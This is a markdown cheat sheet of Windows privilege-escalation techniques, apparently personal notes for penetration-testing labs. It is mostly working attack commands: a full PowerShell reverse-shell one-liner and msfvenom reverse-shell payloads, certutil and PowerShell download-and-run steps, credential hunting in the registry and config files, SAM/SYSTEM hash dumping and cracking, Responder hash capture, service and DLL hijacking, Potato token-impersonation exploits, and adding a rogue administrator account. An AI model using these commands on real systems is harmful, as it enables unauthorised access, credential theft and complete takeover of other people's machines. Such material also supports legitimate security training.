# Windows privilege escalation
   * [Utilities](#utilities)
      * [Shell stabilization and interactivity](#shell-stabilization-and-interactivity)
      * [Useful reverse shells](#useful-reverse-shells)
      * [RDP connection](#rdp-connection)
      * [Port forwarding <em>(Plink)</em>](#port-forwarding-plink)
      * [Copy files from/to the target](#copy-files-fromto-the-target)
   * [Autoenumeration <em>(WinPEAS)</em>](#autoenumeration-winpeas)
   * [Autoenumeration <em>(SharpUp)</em>](#autoenumeration-sharpup)
   * [Autoenumeration <em>(Seatbelt)</em>](#autoenumeration-seatbelt)
   * [Effective permissions listing <em>(AccessChk)</em>](#effective-permissions-listing-accesschk)
   * [Processes monitoring <em>(ProcMon)</em>](#processes-monitoring-procmon)
   * [Windows exploit suggester](#windows-exploit-suggester)
   * [Manual enumeration](#manual-enumeration)
      * [Users and groups](#users-and-groups)
      * [System info](#system-info)
      * [Periphery](#periphery)
      * [Services and tasks](#services-and-tasks)
      * [Registries](#registries)
      * [Stored credentials](#stored-credentials)
      * [Files and folders](#files-and-folders)
   * [Kernel exploits](#kernel-exploits)
   * [Permissions modification](#permissions-modification)
   * [Switching users in console](#switching-users-in-console)
   * [Catching Net-NTLMv2 hashes](#catching-net-ntlmv2-hashes)
   * [NBNS spoofing and NTLM relay <em>(HotPotato)</em>](#nbns-spoofing-and-ntlm-relay-hotpotato)
   * [Exploiting AlwaysInstallElevated](#exploiting-alwaysinstallelevated)
   * [Unquoted service path or service executable modification](#unquoted-service-path-or-service-executable-modification)
   * [Service binpath modification](#service-binpath-modification)
   * [Service registry modification](#service-registry-modification)
   * [DLL hijacking](#dll-hijacking)
   * [Parsing SAM and SYSTEM backups](#parsing-sam-and-system-backups)
   * [Using given privileges](#using-given-privileges)
   * [Token impersonation <em>(RoguePotato)</em>](#token-impersonation-roguepotato)
   * [Token impersonation <em>(PrintSpoofer)</em>](#token-impersonation-printspoofer)
   * [Token impersonation <em>(JuicyPotato)</em>](#token-impersonation-juicypotato)
   * [Token impersonation <em>(Incognito)</em>](#token-impersonation-incognito)
   * [Retrieving browser files <em>(SharpWeb)</em>](#retrieving-browser-files-sharpweb)
   * [Meterpreter's getsystem exploit](#meterpreters-getsystem-exploit)

## Utilities
### Shell stabilization and interactivity
- Listen to reverse shell:
```bash
sudo rlwrap nc -lvnp 443
```

### Useful reverse shells
- Powershell oneliner:
```cmd
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- Base64 encoded powershell oneliner:
```bash

wget https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
python3 mkpsrevshell.py <ip> 443
```
- TCP reverse shell executable:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- Via SMB:
```bash
psexec.py '<username>:<password>@<ip>'
wmiexec.py '<username>:<password>@<ip>'
winexe -U '<username>%<password>' //<ip> cmd.exe
pth-winexe -U '<username>%<lm_hash>:<nt_hash>' //<ip> cmd.exe
```
- Via WinRM:
```bash
evil-winrm -i <ip> -u <username> -p <password>
evil-winrm -i <ip> -u <username> -H <nt_hash>
```

### RDP connection
```bash
xfreerdp +clipboard /w:1280 /h:720 /smart-sizing /cert:ignore /v:<ip> /u:<user> /p:'<password>'
```

### Port forwarding _(Plink)_
- Prepare:
```bash
cp ~/assets-and-tools/tools/plink_0.74/plink64.exe ./
```
- [Copy to the target](#copy-files-fromto-the-target)
- Forward the blocked port:
```cmd
.\plink.exe root@<my_ip> -R <kali_port>:127.0.0.1:<port_to_forward>
```

### Copy files from/to the target
- SMB:
```bash
sudo smbserver.py -smb2support share .
```
```cmd
copy <filename> \\<ip>\share
copy \\<ip>\share\<filename> .
```
- SMB _(simply execute the file)_:
```bash
sudo smbserver.py -smb2support share .
```
```cmd
\\<ip>\share\<filename>
```
- SCP:
```bash
scp <username>@<ip>:<file_in_home_directory> .
scp <filename> <username>@<ip>:<path>
```
- FTP:
```bash
python3 -m pyftpdlib -w -p 2121
```
```cmd
ftp # anonymous user and empty password
open <ip> 2121
put <some_local_file>
```
- HTTP:
```bash
sudo python3 -m http.server 80
```
```cmd
certutil -urlcache -split -f "http://<my_ip>/<filename>" <filename>
powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://<my_ip>/<filename>\", \"<filename>\")"
```

## Autoenumeration _(WinPEAS)_
- Prepare:
```bash
cp ~/assets-and-tools/tools/winpeas_2.0-beta/winPEASany.exe ./
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
.\winpeas.exe
```

## Autoenumeration _(SharpUp)_
- Prepare:
```bash
cp ~/assets-and-tools/tools/sharpup/SharpUp.exe ./
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
.\sharpup.exe
```

## Autoenumeration _(Seatbelt)_
- Prepare:
```bash
cp ~/assets-and-tools/tools/seatbelt_1.1.1/Seatbelt.exe ./
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
.\seatbelt.exe -group=all
```

## Effective permissions listing _(AccessChk)_
- Prepare:
```bash
cp ~/assets-and-tools/tools/accesschk_6.13/accesschk.exe ./
```
- [Copy to the target](#copy-files-fromto-the-target)
- List service permissions:
```cmd
.\accesschk.exe /accepteula -ucqv <service_name>
```
- List registry permissions:
```cmd
.\accesschk.exe /accepteula -uvwdk "<registry_path>"
```
- List file permissions:
```cmd
.\accesschk.exe /accepteula -quvw "C:\<file_path>"
```
- List directory permissions:
```cmd
.\accesschk.exe /accepteula -uwdq "C:\<directory_path>"
```

## Processes monitoring _(ProcMon)_
- Prepare:
```bash
cp ~/assets-and-tools/tools/procmon_3.61/Procmon64.exe ./
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run _(running as administrator required)_:
```
.\procmon.exe
```
- Search for a DLL not found by a system process:
```
Result is NAME NOT FOUND
User is NT AUTHORITY\SYSTEM
Path ends with dll
```

## Windows exploit suggester
- System info _(save output into the `systeminfo.txt` file on Kali)_:
```cmd
systeminfo
wmic qfe
```
- Run Exploit Suggester:
```bash
wes --update
wes systeminfo.txt --definitions ./definitions.zip -i "Elevation of Privilege" --exploits-only
```

## Manual enumeration
### Users and groups
- Username and hostname:
```cmd
echo %username%
hostname
```
- Users and groups:
```cmd
net users
net user <username>
```
```cmd
net localgroup
whoami /groups
```
- List tokens for current and other users _(it doesn't matter if they are enabled or not, they can be used if listed)_:
```cmd
whoami /priv
<username> /priv
```
- Logon requirements:
```cmd
net accounts
```

### System info
- System info:
```cmd
systeminfo
wmic qfe
powershell -c "Get-ComputerInfo"
```

### Periphery
- List drives:
```cmd
powershell -c get-psdrive -psprovider filesystem
```
- Open ports:
```cmd
netstat -an
```
- List shares:
```cmd
net share
```

### Services and tasks
- Current tasks running by the admin or system:
```cmd
tasklist /v | findstr /si "system admin"
```
- Scheduled tasks _(too much output, better find suspicious tasks using winpeas)_:
```cmd
schtasks /query /fo LIST /v
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike \"\Microsoft*\"}"
```
- List services  _(too much output, better find suspicious services using winpeas)_:
```cmd
sc queryex type=service state=all | find /i "SERVICE_NAME:"
powershell -c "Get-Service"
```
- Service info:
```cmd
sc qc "<service_name>"
sc query "<service_name>"
```

### Registries
- Registry info/listing:
```cmd
reg query "<registry_path>"
reg query "HKLM"
reg query "HKCU"
```
- `AlwaysInstallElevated` _(both should be set to 1 for the exploit to work)_:
```cmd
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer"
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer"
```

### Stored credentials
- Search for passwords in registries _(too much output, better check registries known for storing passwords)_:
```cmd
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s
```
- Common registries with stored passwords:
```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```
- Stored windows credentials:
```cmd
cmdkey /list
```
- Search for files that often store passwords:
```cmd
dir /s/b "C:\*sysprep.inf" "C:\*sysprep.xml" "C:\*unattend.xml" "C:\*web.config" 2>nul
```
- Search for passwords in common config files:
```cmd
powershell -c "Get-ChildItem -Path C:\ -Filter unattend.xml -Recurse -Depth 3 -ErrorAction SilentlyContinue |  Select-String -Pattern \"password\" -Context 3,3"
powershell -c "Get-ChildItem -Path C:\ -Filter sysprep -Recurse -Depth 3 -ErrorAction SilentlyContinue |  Select-String -Pattern \"password\" -Context 3,3"
powershell -c "Get-ChildItem -Path C:\ -Filter web.config -Recurse -ErrorAction SilentlyContinue |  Select-String -Pattern \"password\" -Context 3,3"
```
- Search for `SAM` and `SYSTEM` backups:
```cmd
dir /s/b "C:\Windows\Repair\SAM"
dir /s/b "C:\Windows\Repair\SYSTEM"
dir /s/b "C:\Windows\System32\config\SAM"
dir /s/b "C:\Windows\System32\config\SYSTEM"
dir /s/b "C:\Windows\System32\config\RegBack\SAM"
dir /s/b "C:\Windows\System32\config\RegBack\SYSTEM"
```

### Files and folders
- File permissions:
```cmd
icalcs "C:\<file_path>"
```
- Directory permissions:
```cmd
icalcs "C:\<directory_path>"
```
- Look for interesting files in `C:\`, `C:\Program Files`, `C:\Program Files (x86)`, `C:\Users\<username>`, `C:\Users\<username>\Desktop`, `C:\Users\<username>\Downloads`, `C:\Users\<username>\AppData\`, `C:\Users\<username>\AppData\Local\Temp`, `C:\Temp` and other directories:
```cmd
dir /a /q
findstr /spin password *.config *.xml *.ini *.txt 
findstr /spin <some_keyword> *.config *.xml *.ini *.txt 
```

## Kernel exploits
- List of precompiled Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits

## Permissions modification
- If the file or folder is owned by me, I can get all permissions for it:
```cmd
icacls "C:\<file_path>" /grant <user>:(F)
```

## Switching users in console
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
runas /user:<user> .\shell.exe
```
- Run with stored credentials _(or if password for user is not required)_:
```cmd
runas /savecred /user:<user> .\shell.exe
``` 

## Catching Net-NTLMv2 hashes
- Prepare the responder:
```bash
sudo responder -I tun0
```
- Connect to the share from target:
```cmd
//<my_ip>/share/anything
```
- Crack the hash:
```bash
echo '<hash>' > hash
hashcat -m 5600 -a 0 ./hash /usr/share/wordlists/rockyou.txt
```

## NBNS spoofing and NTLM relay _(HotPotato)_
- Prepare the exploit and the reverse shell:
```bash
cp ~/assets-and-tools/tools/hotpotato/Potato.exe ./
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run it on Windows 7:
```cmd
.\potato.exe -ip <windows_ip> -disable_exhaust true -disable_defender true -cmd "<full_path>\shell.exe" 
```
- Run it on Windows Server 2008:
```cmd
.\potato.exe -ip <windows_ip> -disable_exhaust true -disable_defender true --spoof_host WPAD.EMC.LOCAL -cmd "<full_path>\shell.exe" 
```

## Exploiting `AlwaysInstallElevated`
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi > shell.msi
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
msiexec /quite /qn /i shell.msi
```

## Unquoted service path or service executable modification
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Stop/Start service:
```cmd
sc stop <service_name>
sc start <service_name>

net stop <service_name>
net start <service_name> 
```

## Service binpath modification
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Modify service binpath:
```cmd
sc config <service_name> binpath= "\"C:\Users\<username>\AppData\Local\Temp\shell.exe\""
```
- Stop/Start service
```cmd
sc stop <service_name>
sc start <service_name>

net stop <service_name>
net start <service_name> 
```

## Service registry modification
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Modify the registry:
```cmd
reg add "<registry_path>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\<username>\AppData\Local\Temp\shell.exe" /f
```
- Stop/Start service
```cmd
sc stop <service_name>
sc start <service_name>

net stop <service_name>
net start <service_name> 
```

## DLL hijacking
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f dll -o shell.dll
```
- [Copy to the target](#copy-files-fromto-the-target) and put instead of the missing DLL.

## Parsing `SAM` and `SYSTEM` backups
- Run SMB server on Kali:
```bash
sudo smbserver.py share .
```
- Copy files from Windows target.
- Download `creddump7` in Kali:
```bash
cp -r ~/assets-and-tools/tools/creddump7 ./
```
- Extract cached credentials:
```bash
# The output should look something like:
# admin:1004:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
# where a9fdfa038c4b75ebc76dc855dd74f0da is the password hash
python2 ./creddump7/pwdump.py ./SYSTEM ./SAM
```
- Crack the hash _(or you can run `pth-winexe` or `evil-winrm` shell using hash only)_:
```bash
hashcat -m 1000 --force <pass_hash> /usr/share/wordlists/rockyou.txt
```

## Using given privileges
- `SeBackupPrivilege` grants read access to all files regardless of their ACL.
- `SeRestorePrivilege` grants write access to all files regardless of their ACL.
- `SeTakeOwnershipPrivilege` allows to take the ownership of files. Give user full permissions to the file/folder:
```cmd
icacls "<folder_or_file_path>" /q /c /t /grant <username>:F
```

## Token impersonation _(RoguePotato)_
- Works with  `SeImpersonatePrivilege` or/and `SeAssignPrimaryTokenPrivilege` enabled. 
- Prepare the exploit and the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
cp ~/assets-and-tools/tools/roguepotato_1.0/RoguePotato.exe ./
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run socat port redirection on Kali _(choose another port if 9999 is in use on the target)_:
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<target_ip>:9999
```
- Run exploit:
```cmd
.\roguepotato.exe -r <my_ip> -l 9999 -e .\shell.exe
```

## Token impersonation _(PrintSpoofer)_
- Works with  `SeImpersonatePrivilege` enabled. 
- Prepare:
```bash
cp ~/assets-and-tools/tools/printspoofer_1.0/PrintSpoofer64.exe ./
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
.\printspoofer.exe -i -c powershell.exe
```

## Token impersonation _(JuicyPotato)_
- Works with  `SeImpersonatePrivilege` or/and `SeAssignPrimaryTokenPrivilege` enabled _(use RoguePotato or PrintSpoofer on the latest Windows versions)_. 
- Prepare:
```bash
cp ~/assets-and-tools/tools/juicypotato_0.1/JuicyPotato.exe ./
cp ~/assets-and-tools/tools/juicypotato_0.1/JuicyPotato86.exe ./JuicyPotato.exe # X86 version

msfvenom -p windows/shell_reverse_tcp LHOST=<my_ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Choose CLSID _(https://github.com/ohpe/juicy-potato/tree/master/CLSID)_. 
- Run:
```cmd
.\juicypotato.exe -l 1337 -p .\shell.exe -t * -c <clsid>
```

## Token impersonation _(Incognito)_
- Works with  `SeImpersonatePrivilege` and `SeDebugPrivilege` enabled _(use RoguePotato or PrintSpoofer on the latest Windows versions)_. 
- Prepare:
```bash
cp ~/assets-and-tools/tools/juicypotato_0.1/JuicyPotato.exe ./
```
- [Copy to the target](#copy-files-fromto-the-target)
- Add privesc user with admin rights:
```cmd
.\incognito.exe add_user privesc 123456
.\incognito.exe add_localgroup_user Administrators privesc
```

## Retrieving browser files _(SharpWeb)_
- Prepare:
```bash
cp ~/assets-and-tools/tools/sharpweb_1.2/SharpWeb.exe ./
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
.\sharpweb.exe all
```

## Meterpreter's getsystem exploit
- This tool requires your user to be a local admin or to have `SeDebugPrivilege` _(x86 only)_. 
- Prepare the meterpreter shell:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Listen to the reverse shell:
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <ip>
set lport 443
run
```
- Run shell:
```cmd
.\shell.exe
```
- Privesc using metasploit:
```bash
use priv
getsystem
```
